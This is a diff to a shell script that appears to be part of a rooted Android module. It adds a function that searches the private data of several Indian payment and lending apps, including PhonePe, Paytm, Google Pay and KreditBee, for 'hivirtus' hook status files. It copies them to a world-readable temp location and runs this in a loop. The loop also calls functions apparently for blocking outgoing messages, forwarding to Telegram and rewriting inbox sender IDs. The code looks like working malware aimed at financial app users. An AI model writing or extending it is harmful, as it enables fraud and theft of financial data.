@@ -402,6 +402,47 @@ harvest_blocked_outgoing() {
   done
 }
 
+# A16: app writes hook_status to code_cache — root copies to tmp so file manager me dikhe
+harvest_hook_status() {
+  local best="" latest=""
+  for pkg in com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
+             com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
+             com.myairtelapp com.yespay.next com.kreditbee.android com.stashfin.android; do
+    for f in \
+      "/data/user/0/$pkg/code_cache/hivirtus/hook_status.txt" \
+      "/data/data/$pkg/code_cache/hivirtus/hook_status.txt" \
+      "/data/user/0/$pkg/files/hivirtus_hook_status.txt" \
+      "/data/data/$pkg/files/hivirtus_hook_status.txt"
+    do
+      [ -f "$f" ] && [ -s "$f" ] || continue
+      if [ -z "$best" ] || [ "$f" -nt "$best" ]; then
+        best="$f"
+      fi
+    done
+    for f in \
+      "/data/user/0/$pkg/code_cache/hivirtus/hook_status_latest.txt" \
+      "/data/data/$pkg/code_cache/hivirtus/hook_status_latest.txt"
+    do
+      [ -f "$f" ] && [ -s "$f" ] || continue
+      if [ -z "$latest" ] || [ "$f" -nt "$latest" ]; then
+        latest="$f"
+      fi
+    done
+  done
+  [ -f "$MODDIR/hook_status.txt" ] && [ -s "$MODDIR/hook_status.txt" ] && best="$MODDIR/hook_status.txt"
+  if [ -n "$best" ]; then
+    cp -f "$best" /data/local/tmp/hivirtus_hook_status.txt 2>/dev/null
+    chmod 666 /data/local/tmp/hivirtus_hook_status.txt 2>/dev/null
+  fi
+  if [ -n "$latest" ]; then
+    cp -f "$latest" /data/local/tmp/hivirtus_hook_status_latest.txt 2>/dev/null
+    chmod 666 /data/local/tmp/hivirtus_hook_status_latest.txt 2>/dev/null
+  elif [ -f "$MODDIR/hook_status_latest.txt" ]; then
+    cp -f "$MODDIR/hook_status_latest.txt" /data/local/tmp/hivirtus_hook_status_latest.txt 2>/dev/null
+    chmod 666 /data/local/tmp/hivirtus_hook_status_latest.txt 2>/dev/null
+  fi
+}
+
 seed_hooked_pkgs() { return 0; }
 seed_apatch_config() { return 0; }
 
@@ -685,6 +726,7 @@ rewrite_inbox_sender_id() {
 (
   while true; do
     send_tg_test_if_requested
+    harvest_hook_status
     harvest_blocked_outgoing
     forward_blocked_telegram
     rewrite_inbox_sender_id
